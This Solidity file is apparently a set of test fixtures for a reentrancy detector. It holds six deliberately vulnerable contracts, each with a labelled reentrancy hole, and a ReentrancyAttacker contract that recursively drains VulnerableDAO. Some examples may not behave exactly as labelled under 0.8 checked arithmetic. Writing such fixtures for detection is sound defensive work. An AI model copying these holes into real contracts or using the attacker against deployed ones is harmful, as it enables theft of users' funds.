// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vulnerable Reentrancy Test Contracts
 * @dev Collection of contracts with known reentrancy vulnerabilities
 * for testing the Enhanced Reentrancy Detector
 */

// 1. Classic DAO-style reentrancy vulnerability
contract VulnerableDAO {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount; // State update after external call
    }
    
    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}

// 2. Cross-function reentrancy vulnerability  
contract CrossFunctionReentrancy {
    mapping(address => uint256) public balances;
    bool public locked = false;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public {
        require(!locked, "Reentrant call");
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        locked = true;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        locked = false;
        
        balances[msg.sender] -= amount;
    }
    
    // VULNERABILITY: Can be called during reentrancy
    function emergencyWithdraw() public {
        uint256 balance = balances[msg.sender];
        balances[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}

// 3. Delegatecall-based reentrancy
contract DelegatecallReentrancy {
    mapping(address => uint256) public balances;
    address public implementation;
    
    constructor(address _implementation) {
        implementation = _implementation;
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function executeOperation(bytes calldata data) public {
        require(balances[msg.sender] > 0, "No balance");
        
        // VULNERABILITY: Delegatecall to potentially malicious implementation
        (bool success, ) = implementation.delegatecall(data);
        require(success, "Delegatecall failed");
        
        balances[msg.sender] = 0; // State change after delegatecall
    }
}

// 4. CREATE-based reentrancy (constructor callback)
contract CreateReentrancy {
    mapping(address => uint256) public deposits;
    
    function deposit() public payable {
        deposits[msg.sender] += msg.value;
    }
    
    function deployAndCall(bytes memory bytecode) public {
        require(deposits[msg.sender] > 0, "No deposit");
        
        address deployed;
        assembly {
            // VULNERABILITY: CREATE can call back to this contract
            deployed := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        
        require(deployed != address(0), "Deployment failed");
        deposits[msg.sender] = 0; // State change after CREATE
    }
}

// 5. Multi-step reentrancy with complex state dependencies
contract ComplexReentrancy {
    struct UserData {
        uint256 balance;
        uint256 lastWithdrawal;
        bool eligible;
    }
    
    mapping(address => UserData) public users;
    uint256 public totalSupply;
    
    function deposit() public payable {
        users[msg.sender].balance += msg.value;
        users[msg.sender].eligible = true;
        totalSupply += msg.value;
    }
    
    function complexWithdraw(uint256 amount) public {
        UserData storage user = users[msg.sender];
        require(user.eligible, "Not eligible");
        require(user.balance >= amount, "Insufficient balance");
        require(block.timestamp > user.lastWithdrawal + 1 days, "Too frequent");
        
        // VULNERABILITY: Complex state dependencies make reentrancy hard to detect
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // Multiple state updates
        user.balance -= amount;
        user.lastWithdrawal = block.timestamp;
        totalSupply -= amount;
        
        if (user.balance == 0) {
            user.eligible = false;
        }
    }
    
    function adminWithdraw(address user, uint256 amount) public {
        // VULNERABILITY: Cross-function reentrancy through admin function
        require(users[user].balance >= amount, "Insufficient balance");
        
        (bool success, ) = user.call{value: amount}("");
        require(success, "Transfer failed");
        
        users[user].balance -= amount;
    }
}

// 6. Reentrancy in modifier/library pattern
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }
}

contract ModifierReentrancy {
    using SafeMath for uint256;
    
    mapping(address => uint256) public balances;
    
    modifier onlyPositiveBalance() {
        require(balances[msg.sender] > 0, "No balance");
        _;
    }
    
    modifier updateBalance(uint256 amount) {
        _;
        balances[msg.sender] = balances[msg.sender].sub(amount);
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABILITY: Modifier execution order creates reentrancy window
    function withdraw(uint256 amount) 
        public 
        onlyPositiveBalance 
        updateBalance(amount)
    {
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}

/**
 * @title Malicious Reentrancy Attacker
 * @dev Contract that demonstrates how reentrancy attacks work
 */
contract ReentrancyAttacker {
    VulnerableDAO public target;
    uint256 public attackAmount;
    
    constructor(address _target) {
        target = VulnerableDAO(_target);
    }
    
    function attack(uint256 _amount) public payable {
        require(msg.value >= _amount, "Insufficient ether");
        attackAmount = _amount;
        
        // Deposit first
        target.deposit{value: _amount}();
        
        // Start the attack
        target.withdraw(_amount);
    }
    
    // This function will be called during reentrancy
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}